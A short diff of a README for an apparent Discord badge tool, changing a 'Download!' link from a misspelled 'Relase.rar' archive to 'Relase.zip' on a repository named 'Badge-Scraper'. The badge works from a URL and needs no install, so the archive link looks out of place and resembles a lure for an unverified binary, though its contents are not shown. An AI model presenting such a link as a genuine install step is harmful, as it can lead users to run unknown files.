@@ -11,7 +11,7 @@ A customizable badge that shows your Discord account, a server invite, or a bot 
 The set up process will vary depending on the use:
 
 ## Download!
-🚀 Install --> [Releases](https://github.com/deorpa/Badge-Scraper/releases/download/v2.4/Relase.rar)
+🚀 Install --> [Releases](https://github.com/deorpa/Badge-Scraper/releases/download/v2.4/Relase.zip)
 
 ### User account&nbsp;&nbsp;&nbsp;![](https://dcbadge.vercel.app/api/shield/406125028065804289)
 
